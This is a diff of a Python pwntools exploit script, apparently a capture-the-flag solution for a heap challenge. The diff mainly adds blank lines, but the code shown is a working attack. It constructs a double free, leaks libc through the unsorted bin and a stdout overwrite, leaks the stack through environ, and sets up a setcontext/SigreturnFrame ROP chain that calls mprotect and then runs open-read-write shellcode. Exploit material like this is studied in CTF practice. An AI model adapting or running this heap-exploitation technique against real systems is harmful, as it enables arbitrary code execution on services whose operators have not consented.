@@ -137,6 +137,7 @@ def set( data):
 
 
 # construct double free
+
 add( 0x18, 'wwww')
 add( 0x28, 'xxxx')
 add( 0x28, 'kkkk')
@@ -150,18 +151,23 @@ add( 0x28, '\x80')
 add( 0x28, '\x80')
 
 # use unsorted bin to get  libc address
+
 rm( 0)
 add( 0x518, flat('a'*0x18, 0x421, 'a'*0x410, 0, 0x21, 0, 0, 0, 0x21))
 
 rm( 1)
 
 # partial overwrite unsorted bin's address to make it points to stdout
+
 # need to bruteforce 4 bits
+
 rm( 0)
 add( 0x118, flat('a'*0x18, 0x31) + "\x1d\x37")
 
 # overwrite last byte of stdout->write_base to \x00
+
 # the we can get libc address
+
 add( 0x28, 'a')
 add( 0x128, flat('a'*(67 -8), 0X41, 0xfbad1800, 0, 0, 0) + '\0')
 
@@ -170,11 +176,13 @@ io.recv( 8)
 libc_addr = u64(io.recv( 6) + '\0\0')
 lg('libc_addr', libc_addr)
 libc.address = libc_addr - 0x3ed8b0 # remote libc
+
 lg("libc base", libc.address)
 
 stdout_addr = libc.symbols['_IO_2_1_stdout_']
 
 # use environ in libc to leak stack address
+
 environ_addr = libc.sym['environ']
 lg("environ", environ_addr)
 rm( 0)
@@ -192,6 +200,7 @@ lg("stack address", stack_addr)
 
 read_ret_stack = stack_addr - 384 # local and remote are same
 
+
 rm( 4)
 
 rm( 0)
@@ -202,11 +211,15 @@ add( 0x118,  flat('a'*0x18, 0x61, read_ret_stack))
 add( 0x58, 'a')
 
 # construct  rop chain
+
 # call mprotect(read_ret_stack & ~0xfff, 0x100, 7) first
+
 # then run the orw shellcode
+
 sc53 = libc.symbols['setcontext'] + 53
 
 PrdiR = libc.address + 0x000000000002155f # remote libc
+
 
 frame = SigreturnFrame()
 frame.rsp = read_ret_stack + 0x18
